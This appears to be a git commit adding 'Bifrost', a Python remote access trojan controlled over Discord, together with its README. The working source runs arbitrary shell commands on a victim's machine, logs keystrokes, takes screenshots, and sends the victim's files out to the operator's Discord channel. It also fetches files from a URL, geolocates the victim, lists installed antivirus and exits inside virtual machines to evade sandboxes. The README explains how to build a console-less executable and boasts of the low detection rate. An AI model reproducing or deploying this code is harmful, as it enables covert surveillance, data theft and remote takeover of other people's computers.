10ffd7e8d4c89e5d9e2adaef894e735251995a4a
th3r4ven <60748626+th3r4ven@users.noreply.github.com>
2021-06-24 20:39:49 -0300

    Bitfrost v1.0

---
+++ README.md
@@ -0,0 +1,130 @@
+<h1 align="center">
+  <br>
+  <a href="https://github.com/th3r4ven/"><img src="https://i.imgur.com/7oXiiA2.png" width=400 weigth=400 alt="Bifrost"></a>
+  <br>
+  Bifrost
+  <br>
+</h1>
+
+<h4 align="center">Command and Control</h4>
+
+<p align="center">
+    <img src="https://img.shields.io/badge/platform-windows | linux | mac OS-blueviolet">
+    <img src="https://img.shields.io/badge/version-1.0-blueviolet">
+    <img src="https://img.shields.io/badge/python-3.8.6-blueviolet">
+</p>
+
+---
+
+## What's Bifrost?
+
+**Bifrost** is an open-source **Discord BOT** that works as **Command and Control** (C2). This C2 uses Discord API for communication between clients and server.
+
+Developed with Python, this C2 have multiples features for post-exploitation.
+
+## How Bifrost works?
+
+As mentioned before, Bifrost is basically a discord bot that receive commands from the Discord user and do a pre-defined task.
+
+So for every client that you are going to "infect", you will send a copy of this discord bot, and it will respond to you using discord. 
+ This allows you to hide behind Discord service being stealth and have a secure connection between you and your client.
+
+**Disclaimer: This project should be used for authorized testing or educational purposes only.**
+
+### Virustotal
+
+Virustotal detection was **5/67** when there was none defense against sandbox execution.
+
+Antivirus that detected Bifrost as malicious was `SecureAge APEX`, `Jiangmin`, `Cynet`, `Zillya` and `Palo Alto Networks`
+
+
+### Bifrost Features
+
+- [x] Multiple clients.
+- [x] Multi-platform support. 
+- [x] Keylogger.
+- [x] Antivirus enumeration.
+- [x] Real-time communication.
+- [x] Encrypted(HTTPS) communication.
+- [x] Fast and stealth communication trough Discord API.
+- [x] No need of public service.
+- [x] Screenshot gathering.
+- [x] Download and upload of files.
+
+---
+### ⚠️Contributors ⚠️
+
+Bifrost is an open project, so, if you want to add some functionality, improve features or code performance in Bifrost, the best way to get it to the main project is to create a fork and open pull request.
+
+---
+## Installation
+
+1 - Clone or download Bifrost source code;
+    
+2 - Install lib dependencies;
+
+````shell
+pip install -r requirements.txt
+````
+
+3 - Have Discord account;
+
+4 - [Create an application (Bot)](https://discord.com/developers/applications) on Discord;
+
+5 - Go to General information tab and copy your **Application ID**;
+
+6 - Go to Bot tab, create the Bot and copy it's token
+
+7 - Invite your bot to your discord server by filling up the following link with your application ID;
+
+`https://discord.com/oauth2/authorize?client_id=<APP_ID>&scope=bot&permissions=8`
+
+8 - Now create a channel in your Discord server and copy its ID;
+
+**Obs.: Activate developers function in your discord app to copy channel ID easily.**
+
+Now with those 2 information (channel ID and Bot Token), change the var values on 22 and 23 lines in bifrost.py file to your account/channel values.
+
+---
+## Client Installation
+
+After creating your bot, channel and changing the variable values, follow the steps bellow to deploy the payload to your client
+
+### Windows
+
+Create an bifrost executable file using pyinstaller, or sending bifrost.py to client and installing all dependencies.
+
+Using the **executable** file, the client don't need to have python or any dependencies pre-installed.
+
+`pyinstaller bifrost.py --onefile --noconsole --key th3r4ven_bifrost` or \
+`python -m pyinstaller bifrost.py --onefile --noconsole --key th3r4ven_bifrost`
+
+OBS.: All of this params are optional, read pyinstaller documentation for more information on how to use it.
+
+### Linux\Mac OS
+
+You can send the bifrost.py and install the dependencies, or create and script/executable to automate this process, similar to windows installation
+
+---
+
+## To do
+
+* Persistence feature
+* Bind shell connection
+* Stealth Download
+* Upload big files anonymously
+* Live/recorded voice streaming
+* Fix Bugs/Issues
+
+**Screen live stream is not possible trough Discord API :(**
+
+---
+
+## Screenshots
+
+![](imgs/1.PNG)
+![](imgs/2.PNG)
+![](imgs/3.PNG)
+![](imgs/4.PNG)
+
+---
---
+++ bifrost.py
@@ -0,0 +1,395 @@
+#  Copyright (c) 2021.
+#  This code was designed and created by TH3R4VEN, its use is encouraged for academic and professional purposes.
+#  I am not responsible for improper or illegal uses
+#  Follow me on GitHub: https://github.com/th3r4ven
+import discord
+import asyncio
+import subprocess
+import sys
+import requests
+import socket
+import uuid
+import struct
+import os
+import ctypes
+import json
+import re
+import pynput
+from threading import Thread
+import time
+
+TOKEN = ""
+CHANNEL_ID = 123456
+Key = pynput.keyboard.Key
+Listener = pynput.keyboard.Listener
+
+
+class Defense:
+
+    def check_for_vms(self):
+        platform = Utils().platform()
+        rules = ['Virtualbox', 'vmbox', 'vmware']
+        if platform == 'win32':
+            command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
+                                       stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
+                                       creationflags=0x08000000)
+            out, err = command.communicate()
+            command.wait()
+            for rule in rules:
+                if re.search(rule, out, re.IGNORECASE):
+                    sys.exit()
+        elif platform == 'linux':
+            rules.append('Virtualization')
+            rules.append('oracle')
+            command = subprocess.Popen("hostnamectl", stderr=subprocess.PIPE,
+                                       stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
+                                       creationflags=0x08000000)
+            out, err = command.communicate()
+            command.wait()
+            for rule in rules:
+                if re.search(rule, out, re.IGNORECASE):
+                    sys.exit()
+
+
+class KeyL:
+
+    def __init__(self):
+        self.keys = []
+        self.log_data = ''
+
+    def on_press(self, key):
+        self.keys.append(key)
+
+        try:
+            self.log_data += key.char
+
+        except AttributeError:
+            self.log_data += f' {key} '
+
+    def on_release(self, key):
+        if stop_logger:
+            with open("logger.txt", 'wt') as file:
+                file.write(self.log_data)
+            file.close()
+            return False
+
+    def start(self):
+        with Listener(on_press=self.on_press,
+                      on_release=self.on_release) as listener:
+            listener.join()
+
+
+class Screen:
+
+    def screenshot_win(self):
+        from mss.windows import MSS as mss
+        with mss() as sct:
+            filename = sct.shot(mon=-1, output='fullscreen.png')
+        return filename
+
+    def screenshot_linux(self):
+        from mss.linux import MSS as mss
+        with mss() as sct:
+            filename = sct.shot(mon=-1, output='fullscreen.png')
+        return filename
+
+    def screenshot_macos(self):
+        from mss.darwin import MSS as mss
+        with mss() as sct:
+            filename = sct.shot(mon=-1, output='fullscreen.png')
+        return filename
+
+    def download_file(self, local, url):
+        try:
+            response = requests.get(url)
+            with open(f'{local}', 'wb') as file:
+                file.write(response.content)
+            file.close()
+            return "Download was a success"
+        except Exception:
+            return "Fail to download file"
+
+    def upload_file(self, file_path):
+        return "This file can't be uploaded on discord, trying to figure out how to upload big files to a public server"
+
+
+class Utils:
+
+    def get_system_info(self):
+        return {
+            'platform': self.platform(),
+            'plublic_internet_protocol': self.plublic_internet_protocol(),
+            'local_internet_protocol': self.local_internet_protocol(),
+            'mac_address': self.mac_address().upper(),
+            'sys_arquiteture': self.sys_arquiteture(),
+            'device_name': self.device_name(),
+            'username': self.username(),
+            'is_admin': self.is_admin(),
+            'location': self.location()
+        }
+
+    def platform(self):
+        return sys.platform
+
+    def plublic_internet_protocol(self):
+        return requests.get('http://api.ipify.org', verify=False).text
+
+    def local_internet_protocol(self):
+        return socket.gethostbyname(socket.gethostname())
+
+    def mac_address(self):
+        return ':'.join(hex(uuid.getnode()).replace("0x", "").strip('L')[i:i + 2] for i in range(0, 11, 2)).lower()
+
+    def sys_arquiteture(self):
+        return int(struct.calcsize('P') * 8)
+
+    def device_name(self):
+        return socket.getfqdn(socket.gethostname())
+
+    def username(self):
+        return os.getenv('USER', os.getenv('USERNAME', 'user'))
+
+    def is_admin(self):
+        return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)
+
+    def location(self):
+        ip_info = requests.get('http://ipinfo.io', verify=False).text
+        json_data = json.loads(ip_info)
+        latitude, longitude = json_data.get('loc').split(',')
+        return latitude, longitude
+
+
+class Verification:
+
+    def mac_verification(self, message):
+        if re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', message).group() == Utils().mac_address():
+            return True
+        else:
+            return False
+
+
+class DiscordRaven(discord.Client):
+    async def on_ready(self):
+        channel = self.get_channel(CHANNEL_ID)
+        mac = Utils().mac_address().upper()
+        message = f'```New victim connect: \n' \
+                  f'mac_address     -->     {mac}\n' \
+                  f'To interact with the victim, type %help {mac} to see the help message```'
+        await channel.send(message)
+
+    async def sc(self, output, message):
+        if len(output) >= 2000:
+            with open("message.txt", 'wt') as file:
+                file.write(output)
+            file.close()
+            await message.channel.send(file=discord.File("message.txt"))
+            os.remove("message.txt")
+        else:
+            await message.channel.send(f'```{output}```')
+
+    async def on_message(self, message):
+        # don't respond to ourselves
+        global thread
+        global stop_logger
+        if message.author == self.user:
+            return
+
+        received_message = message.content
+
+        if '%' in message.content.lower():
+
+            if received_message.startswith('%sessions'):
+                return await message.channel.send(f'```Victim: {Utils().mac_address().upper()} is connected```')
+
+            if Verification().mac_verification(received_message.lower()):
+
+                if received_message.startswith('%show'):
+                    sys_data = Utils().get_system_info()
+                    data_message = f'```Sys Data: \n' \
+                                   f'Plataform       -->     {sys_data["platform"]}\n' \
+                                   f'plublic_IP      -->     {sys_data["plublic_internet_protocol"]}\n' \
+                                   f'local_IP        -->     {sys_data["local_internet_protocol"]}\n' \
+                                   f'mac_address     -->     {sys_data["mac_address"]}\n' \
+                                   f'sys_arquiteture -->     {sys_data["sys_arquiteture"]}\n' \
+                                   f'device_name     -->     {sys_data["device_name"]}\n' \
+                                   f'username        -->     {sys_data["username"]}\n' \
+                                   f'is_admin        -->     {sys_data["is_admin"]}\n' \
+                                   f'location        -->     {sys_data["location"][0]}, {sys_data["location"][1]}\n\n' \
+                                   f'To interact with the victim, type %help {sys_data["mac_address"]} to see the help message```'
+                    await message.channel.send(
+                        f'{data_message}')
+
+                if received_message.startswith('%help'):
+                    mac = Utils().mac_address().upper()
+                    help_message = ["""
+Connected sessions:
+            ```
+%sessions
+
+    Return all connected users
+
+Example: %sessions
+            ```""", """
+Show Victim data:
+            ```
+%show <MAC_ADDRESS>
+
+    <MAC_ADDRESS>   -> Victim mac address
+
+Example: %show """ + mac + """```""", """
+RCE:
+            ```
+%scmd <MAC_ADDRESS> <command>
+
+    <MAC_ADDRESS>   -> Victim mac address
+    <command>>      -> command to run on victim pc
+
+Example: %raven """ + mac + """ whoami
+            ```""", """
+Screenshot:
+            ```
+%screenshot <MAC_ADDRESS>
+
+    <MAC_ADDRESS>   -> Victim mac address
+
+Example: %screenshot """ + mac + """```""", """
+Get File from victim:
+            ```
+%download <MAC_ADDRESS> <path_to_file>
+
+        <MAC_ADDRESS>   -> Victim mac address
+        <path_to_file>  -> Path to file
+
+Example: %download """ + mac + """ C:\\Users\\User\\Desktop\\some_file.txt```""", """
+Upload a File to victim:
+            ```
+%upload <MAC_ADDRESS> <path_to_save_file_on_victim> <remote_file_location>
+
+        <MAC_ADDRESS>                   -> Victim mac address
+        <path_to_save_file_on_victim>   -> Path save on victim pc
+        <remote_file_location>          -> Path to remote file
+
+Example: %upload """ + mac + """C:\\Users\\User\\Desktop\\some_file.txt 
+http://host.com/some_file.txt```""", """
+Keylogger:
+            ```
+%keylogger <MAC_ADDRESS> start
+
+    <MAC_ADDRESS>   -> Victim mac address
+    This command you start a keylogger on victim
+
+Example: %keylogger """ + mac + """ start
+            ```
+            ```
+%keylogger <MAC_ADDRESS> stop
+
+    <MAC_ADDRESS>   -> Victim mac address
+    This command stop the keylogger on victim and send all the data
+
+Example: %keylogger """ + mac + """ stop```""", """
+Mic capture:
+            ```
+%mic <MAC_ADDRESS>
+
+    <MAC_ADDRESS>   -> Victim mac address
+    Bot joins your voice chat and stream the victim mic
+    <NOT IMPLEMENTED YET>
+
+Example: %mic """ + mac + """
+            ```
+            ```
+%fmic <MAC_ADDRESS>
+
+    <MAC_ADDRESS>   -> Victim mac address
+    Bot leaves your voice chat and stop streaming the victim mic
+    <NOT IMPLEMENTED YET>
+
+Example: %fmic """ + mac + """```""", """
+Antivirus:
+            ```
+%antivirus <MAC_ADDRESS>
+
+    <MAC_ADDRESS>   -> Victim mac address
+    
+    Return all installed antivirus from victim computer
+
+Example: %antivirus """ + mac + """```"""]
+                    for msg in help_message:
+                        time.sleep(0.5)
+                        await message.channel.send(f'{msg}')
+
+                if received_message.startswith('%scmd'):
+                    command = received_message.split(f'%scmd {Utils().mac_address().upper()} ')[1]
+                    command = subprocess.Popen(command.split(), stderr=subprocess.PIPE, stdin=subprocess.DEVNULL,
+                                               stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
+                    out, err = command.communicate()
+                    command.wait()
+                    await self.sc(out, message)
+
+                if received_message.startswith('%screenshot'):
+                    platform = Utils().platform()
+                    if platform == 'win32':
+                        await message.channel.send(file=discord.File(f'{Screen().screenshot_win()}'))
+                    elif platform == 'linux':
+                        await message.channel.send(file=discord.File(f'{Screen().screenshot_linux()}'))
+                    else:
+                        await message.channel.send(file=discord.File(f'{Screen().screenshot_macos()}'))
+                    os.remove('fullscreen.png')
+
+                if received_message.startswith('%keylogger'):
+                    if re.search('start', received_message, re.IGNORECASE):
+                        stop_logger = False
+                        keyl = KeyL()
+                        thread = Thread(target=keyl.start)
+                        thread.start()
+                        await message.channel.send(f'```Keylogger has started```')
+
+                    if re.search('stop', received_message, re.IGNORECASE):
+                        stop_logger = True
+                        thread.join()
+                        await message.channel.send(file=discord.File("logger.txt"))
+                        os.remove('logger.txt')
+
+                if received_message.startswith('%download'):
+                    try:
+                        file_path = received_message.split(f'%download {Utils().mac_address().upper()} ')[1]
+                        await message.channel.send(file=discord.File(file_path))
+                    except Exception:
+                        file_path = received_message.split(f'%download {Utils().mac_address().upper()} ')[1]
+                        await message.channel.send(f'```{Screen().upload_file(file_path)}```')
+
+                if received_message.startswith('%upload'):
+                    local_remote = received_message.split(f'%upload {Utils().mac_address().upper()} ')[1].split()
+                    await message.channel.send(f'```{Screen().download_file(local_remote[0], local_remote[1])}```')
+
+                if received_message.startswith('%mic'):
+                    await message.channel.send(f'```Under development```')
+                    try:
+                        await message.author.voice.channel.connect()
+                    except Exception:
+                        await self.voice_clients[0].disconnect()
+                        return await self.on_message(message)
+
+                if received_message.startswith('%fmic'):
+                    await self.voice_clients[0].disconnect()
+
+                if received_message.startswith('%antivirus'):
+                    platform = Utils().platform()
+                    if platform == 'win32':
+                        command = subprocess.Popen(
+                            ['wmic', r'/Namespace:\\root\SecurityCenter2', 'path', 'AntiVirusProduct', 'get',
+                             r'/value'], stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
+                            shell=True, text=True, creationflags=0x08000000)
+                        out, err = command.communicate()
+                        command.wait()
+                        await self.sc(out, message)
+                    else:
+                        await message.channel.send(f'```Only compatible for windows```')
+
+            else:
+                return
+
+
+Defense().check_for_vms()
+client = DiscordRaven()
+client.run(TOKEN)
